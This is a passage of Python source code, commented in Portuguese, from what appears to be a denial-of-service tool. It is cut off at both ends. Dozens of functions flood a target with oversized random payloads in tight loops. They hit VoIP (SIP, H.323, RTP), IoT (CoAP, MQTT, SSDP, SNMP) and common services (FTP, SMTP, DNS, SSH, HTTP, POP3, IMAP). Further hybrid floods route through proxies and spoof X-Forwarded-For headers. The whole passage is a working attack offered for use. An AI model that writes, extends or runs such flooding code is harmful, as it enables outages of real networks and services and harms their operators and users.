                sock.sendto(payload + random._urandom(16384), (target, 5060))
            print(Fore.GREEN + f"  [SIP-HIGH-RATE-VOIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque H.323 Flood (VoIP)
def h323_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1720))
            payload = b"\x08\x00" + random._urandom(32768)  # H.323 Setup message + 32KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [H323] Enviado para {target}:1720" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP Mass Flood (IoT)
def coap_mass_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(65535)  # 64KB payload
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP-MASS-IOT] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Burst Flood (IoT)
def mqtt_burst_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(32768)
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-BURST-IOT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Mass Flood (VoIP)
def sip_mass_flood_voip(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(65535)
            sock.sendto(payload, (target, 5060))
            print(Fore.GREEN + f"  [SIP-MASS-VOIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque H.323 Burst Flood (VoIP)
def h323_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1720))
            payload = b"\x08\x00" + random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload)
            print(Fore.GREEN + f"  [H323-BURST] Enviado para {target}:1720" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque CoAP Random Flood (IoT)
def coap_random_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + f"\xB3{random.randint(1,999999)}".encode() + random._urandom(32768)
            sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP-RANDOM-IOT] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT Random Flood (IoT)
def mqtt_random_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + f"topic{random.randint(1,999999)}".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-RANDOM-IOT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Random Flood (VoIP)
def sip_random_flood_voip(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = f"INVITE sip:user{random.randint(1,999999)}@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload.encode(), (target, 5060))
            print(Fore.GREEN + f"  [SIP-RANDOM-VOIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque H.323 Mass Flood (VoIP)
def h323_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1720))
            payload = b"\x08\x00" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [H323-MASS] Enviado para {target}:1720" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

def udp_stun_flood(target, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x00\x01\x00\x00" + random._urandom(16384)  # 16KB payload
            sock.sendto(payload, (target, 3478))
            print(Fore.GREEN + f"  [UDP-STUN] Enviado para {target}:3478" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)


# Ataque CoAP High Rate Flood (IoT)
def coap_high_rate_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65"
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (target, 5683))
            print(Fore.GREEN + f"  [COAP-HIGH-RATE-IOT] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque MQTT High Rate Flood (IoT)
def mqtt_high_rate_flood_iot(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1883))
            payload = b"\x10\x0E\x00\x04\x4D\x51\x54\x54\x04\x02\x00\x00\x00\x02\x41\x42" + random._urandom(32768)
            for _ in range(20):  # 20 pacotes por iteração
                sock.send(payload)
            print(Fore.GREEN + f"  [MQTT-HIGH-RATE-IOT] Enviado para {target}:1883" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SIP Burst Flood (VoIP)
def sip_burst_flood_voip(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"INVITE sip:user@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP 192.168.1.1\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n"
            for _ in range(100):  # Burst de 100 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 5060))
            print(Fore.GREEN + f"  [SIP-BURST-VOIP] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque H.323 Random Flood (VoIP)
def h323_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 1720))
            payload = b"\x08\x00" + f"call{random.randint(1,999999)}".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [H323-RANDOM] Enviado para {target}:1720" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IoT SSDP Flood
def iot_ssdp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n" + random._urandom(32768)
            sock.sendto(payload, (target, 1900))
            print(Fore.GREEN + f"  [IOT-SSDP] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque VoIP RTP Flood
def rtp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x80\x08" + random._urandom(32768)  # RTP header + 32KB payload
            sock.sendto(payload, (target, 5004))  # Porta padrão RTP
            print(Fore.GREEN + f"  [RTP] Enviado para {target}:5004" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IoT SSDP Burst Flood
def iot_ssdp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 1900))
            print(Fore.GREEN + f"  [IOT-SSDP-BURST] Enviado para {target}:1900" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque VoIP RTP Mass Flood
def rtp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x80\x08" + random._urandom(65535)  # 64KB payload
            sock.sendto(payload, (target, 5004))
            print(Fore.GREEN + f"  [RTP-MASS] Enviado para {target}:5004" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IoT SNMP Flood
def iot_snmp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(32768)
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [IOT-SNMP] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque VoIP RTP Burst Flood
def rtp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x80\x08" + random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload, (target, 5004))
            print(Fore.GREEN + f"  [RTP-BURST] Enviado para {target}:5004" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IoT SNMP Mass Flood
def iot_snmp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04" + random._urandom(32) + b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00" + random._urandom(65535)
            sock.sendto(payload, (target, 161))
            print(Fore.GREEN + f"  [IOT-SNMP-MASS] Enviado para {target}:161" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque VoIP SIP Random Burst Flood
def sip_random_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = f"INVITE sip:user{random.randint(1,999999)}@domain.com SIP/2.0\r\nVia: SIP/2.0/UDP {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\nFrom: <sip:attacker@domain.com>\r\nTo: <sip:user@domain.com>\r\nCall-ID: " + random._urandom(32).hex().encode() + b"\r\nCSeq: 1 INVITE\r\n\r\n".encode()
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 5060))
            print(Fore.GREEN + f"  [SIP-RANDOM-BURST] Enviado para {target}:5060" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IoT CoAP Mass Burst Flood
def coap_mass_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\x40\x01" + random._urandom(8) + b"\xB3\x63\x6F\x72\x65" + random._urandom(65535)
            for _ in range(20):  # Burst de 20 pacotes
                sock.sendto(payload, (target, 5683))
            print(Fore.GREEN + f"  [COAP-MASS-BURST] Enviado para {target}:5683" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque FTP Flood
def ftp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 21))
            payload = b"USER anonymous\r\n" + random._urandom(32768)  # 32KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [FTP] Enviado para {target}:21" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque SMTP Flood
def smtp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 25))
            payload = b"HELO example.com\r\nMAIL FROM: <attacker@example.com>\r\n" + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [SMTP] Enviado para {target}:25" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Service Flood
def dns_service_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1,999999)}.com", dns.rdatatype.ANY).to_wire() + random._urandom(32768)
            sock.sendto(payload, (target, 53))
            print(Fore.GREEN + f"  [DNS-SERVICE] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSH Flood
def ssh_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 22))
            payload = b"SSH-2.0-" + random._urandom(32768)  # 32KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [SSH] Enviado para {target}:22" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP Service Flood
def http_service_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 80))
            payload = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n" + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [HTTP-SERVICE] Enviado para {target}:80" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque FTP Burst Flood
def ftp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 21))
            payload = b"USER anonymous\r\n" + random._urandom(16384)
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload)
            print(Fore.GREEN + f"  [FTP-BURST] Enviado para {target}:21" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SMTP Mass Flood
def smtp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 25))
            payload = b"HELO example.com\r\nMAIL FROM: <attacker@example.com>\r\n" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [SMTP-MASS] Enviado para {target}:25" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Service Burst Flood
def dns_service_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1,999999)}.com", dns.rdatatype.ANY).to_wire()
            for _ in range(50):  # Burst de 50 pacotes
                sock.sendto(payload + random._urandom(16384), (target, 53))
            print(Fore.GREEN + f"  [DNS-SERVICE-BURST] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSH Mass Flood
def ssh_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 22))
            payload = b"SSH-2.0-" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [SSH-MASS] Enviado para {target}:22" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP Service Mass Flood
def http_service_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 80))
            payload = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [HTTP-SERVICE-MASS] Enviado para {target}:80" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque FTP Random Flood
def ftp_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 21))
            payload = f"USER user{random.randint(1,999999)}\r\n".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [FTP-RANDOM] Enviado para {target}:21" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SMTP Burst Flood
def smtp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 25))
            payload = b"HELO example.com\r\nMAIL FROM: <attacker@example.com>\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload + random._urandom(16384))
            print(Fore.GREEN + f"  [SMTP-BURST] Enviado para {target}:25" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Service Mass Flood
def dns_service_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1,999999)}.com", dns.rdatatype.ANY).to_wire() + random._urandom(65535)  # 64KB adicional
            sock.sendto(payload, (target, 53))
            print(Fore.GREEN + f"  [DNS-SERVICE-MASS] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSH Burst Flood
def ssh_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 22))
            payload = b"SSH-2.0-"
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload + random._urandom(16384))
            print(Fore.GREEN + f"  [SSH-BURST] Enviado para {target}:22" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP Service Burst Flood
def http_service_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 80))
            payload = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload + random._urandom(16384))
            print(Fore.GREEN + f"  [HTTP-SERVICE-BURST] Enviado para {target}:80" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque FTP High Rate Flood
def ftp_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 21))
            payload = b"USER anonymous\r\n"
            for _ in range(20):  # 20 pacotes por iteração
                sock.send(payload + random._urandom(16384))
            print(Fore.GREEN + f"  [FTP-HIGH-RATE] Enviado para {target}:21" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SMTP Random Flood
def smtp_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 25))
            payload = f"HELO example{random.randint(1,999999)}.com\r\nMAIL FROM: <attacker{random.randint(1,999999)}@example.com>\r\n".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [SMTP-RANDOM] Enviado para {target}:25" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque DNS Service High Rate Flood
def dns_service_high_rate_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = dns.message.make_query(f"test{random.randint(1,999999)}.com", dns.rdatatype.ANY).to_wire()
            for _ in range(20):  # 20 pacotes por iteração
                sock.sendto(payload + random._urandom(16384), (target, 53))
            print(Fore.GREEN + f"  [DNS-SERVICE-HIGH-RATE] Enviado para {target}:53" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque SSH Random Flood
def ssh_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 22))
            payload = f"SSH-2.0-{random.randint(1,999999)}".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [SSH-RANDOM] Enviado para {target}:22" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP Service Random Flood
def http_service_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 80))
            payload = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\n".encode() + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [HTTP-SERVICE-RANDOM] Enviado para {target}:80" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque POP3 Flood
def pop3_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 110))
            payload = b"USER user\r\n" + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [POP3] Enviado para {target}:110" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IMAP Flood
def imap_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 143))
            payload = b"LOGIN user pass\r\n" + random._urandom(32768)
            sock.send(payload)
            print(Fore.GREEN + f"  [IMAP] Enviado para {target}:143" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque POP3 Burst Flood
def pop3_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 110))
            payload = b"USER user\r\n"
            for _ in range(50):  # Burst de 50 pacotes
                sock.send(payload + random._urandom(16384))
            print(Fore.GREEN + f"  [POP3-BURST] Enviado para {target}:110" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)

# Ataque IMAP Mass Flood
def imap_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((target, 143))
            payload = b"LOGIN user pass\r\n" + random._urandom(65535)  # 64KB payload
            sock.send(payload)
            print(Fore.GREEN + f"  [IMAP-MASS] Enviado para {target}:143" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)




# Ataque Híbrido HTTP-UDP Flood
def hybrid_http_udp_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            # HTTP
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.01)
            # UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)
            sock.sendto(payload, (target, port))
            print(Fore.GREEN + f"  [HYBRID-HTTP-UDP] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque Híbrido TCP-SYN + HTTP Flood
def hybrid_tcp_http_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
